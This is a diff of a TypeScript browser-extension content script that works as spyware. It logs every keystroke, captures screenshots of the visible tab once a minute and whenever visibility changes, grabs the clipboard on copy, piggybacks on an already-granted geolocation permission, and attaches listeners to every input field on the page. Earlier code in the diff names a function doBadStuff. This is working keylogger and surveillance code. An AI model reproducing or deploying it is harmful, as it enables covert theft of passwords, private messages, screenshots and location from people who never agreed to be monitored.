@@ -1,8 +1,10 @@
 import _ from "lodash";
-import { IKeyLogEntry } from "src/interfaces";
-import { BackgroundMessage, StorageKey } from "../consts";
-import { sendMessage, updateGeolocation } from "../utils/page-utils";
-import { logData, simplePrepend, writeLog } from "../utils/shared-utils";
+import {
+  captureClipboard,
+  captureGeolocation,
+  captureKeylogBuffer,
+  captureVisibleTab,
+} from "../utils/page-utils";
 
 let buffer = "";
 
@@ -12,43 +14,51 @@ function piggybackGeolocation() {
     .query({ name: "geolocation" })
     .then(({ state }: { state: string }) => {
       if (state === "granted") {
-        updateGeolocation();
+        captureGeolocation();
       }
     });
 }
 
-async function doBadStuff() {
-  if (document.visibilityState === "visible") {
-    sendMessage(BackgroundMessage.CAPTURE_VISIBLE_TAB);
-  }
-}
-
-const writeBuffer = _.debounce(async () => {
+const debouncedCaptureKeylogBuffer = _.debounce(async () => {
   if (buffer.length > 0) {
-    await simplePrepend<IKeyLogEntry>(StorageKey.KEY_LOG, {
-      ...logData(),
-      url: window.location.href,
-      buffer,
-    });
+    await captureKeylogBuffer(buffer);
 
     buffer = "";
-
-    writeLog("Wrote keylog buffer");
   }
 }, 2000);
 
 document.addEventListener("keyup", (e: KeyboardEvent) => {
   buffer += e.key;
 
-  writeBuffer();
+  debouncedCaptureKeylogBuffer();
 });
 
-document.addEventListener("visibilitychange", doBadStuff);
+const inputs: WeakSet<Element> = new WeakSet();
 
+const debouncedHandler = _.debounce(() => {
+  [...document.querySelectorAll("input,textarea,[contenteditable")]
+    .filter((input: Element) => !inputs.has(input))
+    .map((input) => {
+      input.addEventListener(
+        "input",
+        _.debounce((e) => {
+          console.log(e);
+        }, 1000)
+      );
+
+      inputs.add(input);
+    });
+}, 1000);
+
+const observer = new MutationObserver(() => debouncedHandler());
+observer.observe(document.body, { subtree: true, childList: true });
+
+document.addEventListener("visibilitychange", captureVisibleTab);
 document.addEventListener("click", piggybackGeolocation);
+document.addEventListener("copy", captureClipboard);
 
 setInterval(() => {
-  doBadStuff();
+  captureVisibleTab();
 }, 60 * 1e3);
 
-doBadStuff();
+captureVisibleTab();
